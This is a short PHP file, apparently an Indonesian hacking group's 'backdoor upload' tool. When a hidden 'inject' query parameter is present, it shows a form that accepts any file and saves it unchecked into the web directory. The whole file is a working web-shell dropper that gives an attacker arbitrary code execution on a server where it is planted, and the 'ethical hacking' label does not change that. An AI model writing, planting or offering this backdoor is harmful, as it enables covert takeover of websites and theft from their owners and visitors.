<?php 
if(isset($_GET['inject']))
{ 
if(isset($_POST['cekfile']))
{
move_uploaded_file($_FILES["file"]["tmp_name"],"".$_FILES["file"]["name"]);
echo "Upload berhasil";
}
else
{
echo '<form enctype="multipart/form-data" action="" method="post">
<h3><u>X-code Backdoor Upload for ethical hacking</u></h3>
Oleh : Kurniawan - xcode.or.id<br />
Nama file : <input type="file" name="file" />
<br />
<input type="submit" name="cekfile" value="Upload">
</form>';
 } 
 }
?>
